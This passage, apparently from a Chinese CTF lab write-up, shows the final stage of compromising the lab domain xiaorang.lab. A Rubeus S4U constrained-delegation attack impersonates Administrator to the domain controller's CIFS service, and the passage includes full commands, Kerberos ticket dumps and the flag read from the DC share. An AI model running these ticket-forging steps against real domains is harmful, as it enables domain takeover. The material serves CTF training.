cRnVv+kqxbDV6VTheWZ0gIA1fUBsAUPWwmAJHVFIQbIKh/n2SCt8m8jRi6zSPHZLoDZx0Iy2oB7jFDlmoPtHpesyqGWnyFDu0I0XAJ/fnnyWCKl+OiHzbmitVdEMo6WeEdsW1W1nkDfevjqZa2Dbgl
DQHkQCLpYPU2wG2xYbi+Ga6U+qcybsU5rfDDW6MIfhvv/KIo5dy33F4S+Id0EYWa+4OdZ9J/MNqaMxzPcLjnGs6c47vVyLaIqfvikbDwAV5s6bGhF9xBkMv6Cl9ApL/x8lXdbrjmbKDvp9i+NZA750
gXM9CSCE74Ed9vgCFf+20RaMCR/wN0YIg+XvTbYUH0NQp7vtf9GavE07Kzli2GX+wcVkSwmTN2qHafXCQ+BRIKzFS2FVswNg890P+gHg6xl7WZMf+79/3Y3h/cMcwdyxsLfngkqkcKzlwdVW1xYO0z
peVfaxmL/HRKNwX5jilWOdBMDMPCOVu48F/uruC8CWkWwvFMyNNq48qwiJPTNzM/Lfn8P+bCZtwWa+F6fUwJ15WWQ3zAcQGt2w8E+bGEDoJ1upBvpPjLgZnd57eZ0uwTGjgdowgdegAwIBAKKBzwSB
zH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCTiyZn+XOB4h4hckaSjRxXoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDYyMzEzMj
EzOFqmERgPMjAyNTA2MjMyMzIxMzhapxEYDzIwMjUwNjMwMTMyMTM4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==

  ServiceName              :  krbtgt/xiaorang.lab
  ServiceRealm             :  XIAORANG.LAB
  UserName                 :  MSSQLSERVER$
  UserRealm                :  XIAORANG.LAB
  StartTime                :  2025/6/23 21:21:38
  EndTime                  :  2025/6/24 7:21:38
  RenewTill                :  2025/6/30 21:21:38
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  k4smZ/lzgeIeIXJGko0cVw==
  ASREP (key)              :  E376ABF07CFD9E4647E06D2B11084C91
```
申请到tgt，然后注入票据。这里有个巨大无比的坑，就是vshell的交互式终端输入是有长度限制的。之前一直没发现所以不停地报错说格式错误。卡了半小时搞得我红温了。
```powershell
C:\Users\MSSQLSERVER\Desktop>.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE28E33lAa4brWNnfRBxfC5cM2IqSFWdrRIJEzc2XcUHbsVYPOqbebnUoaj7QvnHTmxfmoi+8W3BBrDCyJgsQyFBzxvIXOipH3SMlGEJ1jfWxxP/fbwT+JHGWlPd+o9OwqPBXA8Ok3B+IlgBeN8NiYUsPWuwDLkt9cqGHrfEmoZENs+bApWyO9YzOYmskG5YroTrCffcm3dl6jjbgoO7O3hWZN1V1VHkuSdr4U6ydciDowJLKNB0SmHrZjpW22EQwaqluAXdO3D2fXqR7lynayIc4UXMQd+beyFrQyvapZvcjBNmQkcnAyPPvecCvgRr2V6bk2ABtB1PfdBpDEifhOPah8rZ+ZODNEUN9KKhTwEM0zQl6KlGgJNqly5X0m62KLCIhol9nYo0WrzKoxrmhm7udSxR79JKS//h8ehkBtqEglwiKquR/l7vzDr+7f2yDzinb3pPXbjiphhLbjSIfyMwXvQxeosG1/R/IDmv+mDlael+T9uZxlU8c59TR6+NVya9BgFS/6ayqeC+el/GE42ZGxSltggrwHBwVDbj5jfKzUVrYNtRgtWQwRcZaF9rTfDbKJKNg7Bbtai5VhOCdsUYU6Ree6fqnADmoAUbvdkqpKDkvb+2ZHF1pl0XNAGj1Uljp6HsH+ZV8cHctm0btkPGwBD68+rfGYjHe2+QfMQuI7y3o+QpwMcISL2733akGCI8kxp7or8x9BbzaXLpXvtMf0pk/KHYOougCJpagfz4P7PF2urhnOp1eDIZeg4XifO1bk02YIcTECTXp9RgESj9p54c6lFHzujvEVIBxoyobZd5CW4HxJg6x9L/k9HS/SgZ/NmXeEWLwvYooxq7Hd0VPi/xGuXyjK2iOS1hEzJSDRj4O9E/2MMp6PqAk1okcvzKzHp1krWdmzhClPioBKWBherwUmyyxm9a88S9CFSDGIc/fDy9cblFtnh8jSiP3HRea2HPki0NcxnHeQF5oPrKWMCNcgPsgsJQ9IFMJrW63rGt/ImrXPiYGQpQ7Bkvqd9sU5bnFwuNKDHIcr6lE8IOBCAgp1AVM/Q/x1bop79EhJkUbYRgi2N7biep9Er2nPsPKUR1eUSoaV2O43fjXZLdXpzmiQvfLtqwOEJgNGUXAfZKtuO2X4CXlOalOWGmYzeh2OwtHIXFIzan3Xe20D3gpbfnQ9DYQcsXd2SBZ36oLEz1rXiyx7EX6wzMB0cvvPIDUpx9qMDd0maSG71c2xc3uUXZ6PBYkisjENDOUlOD52J8wg9ndTgZCBoOSMTU27EbT4B3K3D2wqX0wHEUulfC5SiWBpyZpqPX98dv5R20sfVTa2qgQUHQyEnR5t+nMuVgc/2vilUyonO1X9+x8iyj6b+3miJXM4nvG1QUcQYoEq8j8EiFVvpDXl6x8+9M0IfYUhpvhfTefH5d7Tc1ZY89oC0itiNYCAHUrwXlHjyt2t7terdmuPos3p4xnqujgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBB+60XHSC6wRZtd0hVi2M/IoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDYyMzEzMjY0N1qmERgPMjAyNTA2MjMyMzI2NDdapxEYDzIwMjUwNjMwMTMyNjQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'MSSQLSERVER$@XIAORANG.LAB'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2self request to 172.22.2.3:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'MSSQLSERVER$@XIAORANG.LAB'
[*] base64(ticket.kirbi):

      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
      VkVSJA==

[*] Impersonating user 'Administrator' to target SPN 'CIFS/DC.xiaorang.lab'
[*] Building S4U2proxy request for service: 'CIFS/DC.xiaorang.lab'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2proxy request to domain controller 172.22.2.3:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/DC.xiaorang.lab':

      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
[+] Ticket successfully imported!
```
```powershell
C:\Users\MSSQLSERVER\Desktop>type \\DC.xiaorang.lab\C$\users\administrator\flag\flag04.txt
 ######:                                               ###   ######:                             ##
 #######                         ##                   :###   #######                             ##
 ##   :##                        ##                  .####   ##   :##                            ##
 ##    ##   ##.####  ##    ##  #######    .####:     ##.##   ##    ##   .####.    :####     :###.##
 ##   :##   #######  ##    ##  #######   .######:   :#: ##   ##   :##  .######.   ######   :#######
 #######.   ###.     ##    ##    ##      ##:  :##  .##  ##   #######:  ###  ###   #:  :##  ###  ###
 #######.   ##       ##    ##    ##      ########  ##   ##   ######    ##.  .##    :#####  ##.  .##
 ##   :##   ##       ##    ##    ##      ########  ########  ##   ##.  ##    ##  .#######  ##    ##
 ##    ##   ##       ##    ##    ##      ##        ########  ##   ##   ##.  .##  ## .  ##  ##.  .##
 ##   :##   ##       ##:  ###    ##.     ###.  :#       ##   ##   :##  ###  ###  ##:  ###  ###  ###
 ########   ##        #######    #####   .#######       ##   ##    ##: .######.  ########  :#######
 ######     ##         ###.##    .####    .#####:       ##   ##    ###  .####.     ###.##   :###.##


Well done hacking!
This is the final flag, you deserve it!


flag04: flag{5bdecbdc-e406-4553-a048-09c37d2ea5d4}
```
直接读dc上的flag即可。
![](<assets/Pasted image 20250623214255.png>)
![](<assets/Pasted image 20250623214611.png>)

